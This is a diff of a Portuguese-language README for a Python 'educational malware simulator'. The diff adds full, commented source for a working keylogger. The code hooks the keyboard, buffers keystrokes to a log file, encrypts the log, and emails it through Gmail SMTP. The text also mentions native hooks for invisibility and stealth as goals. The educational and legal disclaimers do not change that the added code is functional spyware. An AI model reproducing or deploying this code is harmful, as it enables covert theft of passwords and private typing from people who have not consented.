@@ -1,8 +1,9 @@
 # 🛡️ Simulador Educativo de Malware com Python
 
 ## 🎯 Objetivo
-
-Este projeto tem como propósito implementar, documentar e compartilhar um estudo prático utilizando Python para simular o comportamento de malwares em um ambiente seguro e controlado. O foco é educativo, com o intuito de promover o entendimento sobre segurança da informação.
+Implementar, documentar e compartilhar um estudo prático utilizando Python para simular o comportamento de malwares em um ambiente seguro e controlado.
+O foco é educativo, com o intuito de promover o entendimento sobre segurança da informação.
+> ⚠️ **Aviso Legal**: Este projeto é estritamente educativo. Nenhuma funcionalidade deve ser utilizada para fins maliciosos ou fora de ambientes controlados.
 
 ### Componentes do Projeto
 
@@ -16,7 +17,7 @@ Este projeto tem como propósito implementar, documentar e compartilhar um estud
   - Tornar o script mais furtivo  
   - Envio automático por e-mail
 
-## 🖥️ Ambiente & 🔧 Ferramentas Utilizadas
+## 🖥️ Ambiente & Ferramentas Utilizadas
 
 O projeto foi desenvolvido em um computador pessoal utilizando o Visual Studio Code (VSCode) com Python. Abaixo, o passo a passo para configurar o ambiente:
 
@@ -59,7 +60,7 @@ malware-simulador/
 
 ## 📚 Ransomware Simulado
 
-Este módulo simula o comportamento de um ransomware de forma educativa. O código está comentado linha por linha no arquivo `simransomware.py`.
+>Este módulo simula o comportamento de um ransomware de forma educativa. O código está comentado linha por linha no arquivo `simransomware.py`.
 
 Funcionalidades:
 
@@ -228,9 +229,192 @@ if __name__ == "__main__":
 ```
 
 ## 🎹 Keylogger Simulado
+>Este módulo simula o comportamento de um keylogger de forma educativa. O código está comentado linha por linha no arquivo `keyloggerv2.py`.
 
-> Em desenvolvimento: este módulo irá capturar teclas pressionadas, armazenar em arquivo `.txt`, ocultar o processo e enviar os dados por e-mail automaticamente.
+### 🚀 Estratégias usadas para deixar a captura de teclas mais eficiente
 
+**1. Trocar `pynput` por `keyboard` (mais leve e direto)**
+
+Vantagens:
+- Mais leve e com menos sobrecarga que pynput.
+- Permite escutar teclas com menos latência.
+- Suporte direto a hotkeys e gravação de sequências.
+
+**2. Buffer de escrita com `queue` para evitar I/O constante**
+
+Vantagens:
+- Reduz uso de disco.
+- Aumenta desempenho.
+- Evita travamentos em sistemas com I/O lento.
+
+**3. Captura por hook nativo (nível avançado)**
+
+Para máxima eficiência e invisibilidade, é possível usar hooks nativos com `ctypes` ou `pywin32` no Windows. Isso exige conhecimento de APIs de sistema e é mais complexo.
+
+Vantagens:
+- Menor latência.
+- Menor consumo de memória.
+- Maior controle sobre eventos.
+
+Para fins didáticos e eficiência real, minhas modificações foram:
+
+- ✅ Usar keyboard para captura mais leve.
+- ✅ Implementar buffer com queue para reduzir I/O.
+- ✅ (Não implementado no exemplo abaixo) Explorar hooks nativos.
+
+
+### 🧩 Parte 1: Importação de bibliotecas
+
+```python
+import keyboard              # Captura eventos de teclado em tempo real
+import threading             # Permite executar funções em paralelo (multithreading)
+import time                  # Usado para controlar intervalos de tempo
+from queue import Queue      # Estrutura de dados para armazenar teclas antes de gravar
+from cryptography.fernet import Fernet  # Criptografia simétrica segura
+import smtplib               # Envio de e-mails via protocolo SMTP
+import ssl                   # Criação de conexão segura (SSL/TLS)
+from email.message import EmailMessage  # Composição de mensagens de e-mail
+import os                    # Manipulação de arquivos e verificação de existência
+```
+
+---
+
+### ⚙️ Parte 2: Configurações iniciais
+
+```python
+# Caminhos dos arquivos usados no projeto
+CAMINHO_LOG = "log.txt"                  # Arquivo temporário onde as teclas são registradas
+CAMINHO_LOG_CRIPTO = "log_encrypted.txt" # Arquivo criptografado
+CAMINHO_CHAVE = "chave.key"              # Arquivo que armazena a chave de criptografia
+
+# Credenciais de e-mail
+EMAIL_REMETENTE = "seuemail@gmail.com"       # E-mail que envia o log
+EMAIL_SENHA = "senha de app do seu email"    # Senha de aplicativo gerada pelo Gmail
+EMAIL_DESTINATARIO = "seuemail@gmail.com"    # E-mail que recebe o log
+
+INTERVALO_GRAVACAO = 5  # Intervalo (em segundos) entre gravações do buffer no arquivo
+```
+
+---
+
+### ⌨️ Parte 3: Captura de teclas e buffer
+
+```python
+fila = Queue()  # Cria uma fila para armazenar teclas pressionadas antes de gravar
+
+# Função chamada a cada tecla pressionada
+def capturar_tecla(evento):
+    nome = evento.name  # Obtém o nome da tecla
+
+    # Identifica e formata teclas especiais
+    if nome == "space":
+        fila.put(" ")
+    elif nome == "enter":
+        fila.put("\n")
+    elif nome == "tab":
+        fila.put("\t")
+    elif nome == "backspace":
+        fila.put(" [BACKSPACE] ")
+    elif len(nome) == 1:
+        fila.put(nome)  # Tecla comum (letra, número ou símbolo)
+    else:
+        fila.put(f"[{nome}] ")  # Tecla especial (ex: shift, ctrl, etc.)
+```
+
+---
+
+### 🗂️ Parte 4: Gravação do buffer em arquivo
+
+```python
+# Função que grava o conteúdo da fila no arquivo de log
+def gravar_buffer():
+    while True:  # Loop contínuo em segundo plano
+        if not fila.empty():  # Se houver teclas na fila
+            with open(CAMINHO_LOG, "a", encoding="utf-8") as f:
+                while not fila.empty():
+                    tecla = fila.get()  # Remove a próxima tecla da fila
+                    f.write(tecla)      # Escreve no arquivo
+        time.sleep(INTERVALO_GRAVACAO)  # Aguarda antes de verificar novamente
+```
+
+---
+
+### 🔐 Parte 5: Criptografia do log
+
+```python
+# Gera uma nova chave de criptografia se não existir
+def gerar_chave():
+    if not os.path.exists(CAMINHO_CHAVE):
+        chave = Fernet.generate_key()
+        with open(CAMINHO_CHAVE, "wb") as f:
+            f.write(chave)
+
+# Carrega a chave de criptografia do arquivo
+def carregar_chave():
+    with open(CAMINHO_CHAVE, "rb") as f:
+        return f.read()
+
+# Criptografa o conteúdo do arquivo de log
+def criptografar_log():
+    chave = carregar_chave()
+    fernet = Fernet(chave)
+
+    with open(CAMINHO_LOG, "rb") as f:
+        dados = f.read()
+
+    dados_criptografados = fernet.encrypt(dados)
+
+    with open(CAMINHO_LOG_CRIPTO, "wb") as f:
+        f.write(dados_criptografados)
+```
+
+---
+
+### 📧 Parte 6: Envio por e-mail
+
+```python
+# Envia o arquivo criptografado por e-mail
+def enviar_email():
+    msg = EmailMessage()
+    msg["Subject"] = "Log criptografado"
+    msg["From"] = EMAIL_REMETENTE
+    msg["To"] = EMAIL_DESTINATARIO
+    msg.set_content("Segue em anexo o log criptografado.")
+
+    # Anexa o arquivo criptografado
+    with open(CAMINHO_LOG_CRIPTO, "rb") as f:
+        conteudo = f.read()
+        msg.add_attachment(conteudo, maintype="application", subtype="octet-stream", filename="log_encrypted.txt")
+
+    contexto = ssl.create_default_context()
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=contexto) as servidor:
+        servidor.login(EMAIL_REMETENTE, EMAIL_SENHA)
+        servidor.send_message(msg)
+```
+
+---
+
+### 🚀 Parte 7: Execução principal do programa
+
+```python
+if __name__ == "__main__":
+    gerar_chave()  # Garante que a chave de criptografia esteja disponível
+
+    # Inicia uma thread em segundo plano para gravar o buffer periodicamente
+    threading.Thread(target=gravar_buffer, daemon=True).start()
+
+    # Inicia a escuta de teclas pressionadas
+    keyboard.on_press(capturar_tecla)
+
+    try:
+        keyboard.wait()  # Mantém o programa rodando até ser interrompido manualmente
+    except KeyboardInterrupt:
+        pass  # Permite encerrar com Ctrl+C sem erro
+
+    # Após encerramento, criptografa o log e envia por e-mail
+    criptografar_log()
+    enviar_email()
+```
 
 ## 📚 Aprendizados | A Importância da Cibersegurança e da Educação Digital
 
@@ -317,6 +501,3 @@ A maior vulnerabilidade de qualquer sistema é o fator humano. Investir em educa
 - [GitBook: Formação GitHub Certification](https://gitbook.com/)
 - [Documentação do GitHub](https://docs.github.com/)
 - [Guia Markdown do GitHub](https://guides.github.com/features/mastering-markdown/)
-
-
-> ⚠️ **Aviso Legal**: Este projeto é estritamente educativo. Nenhuma funcionalidade deve ser utilizada para fins maliciosos ou fora de ambientes controlados.
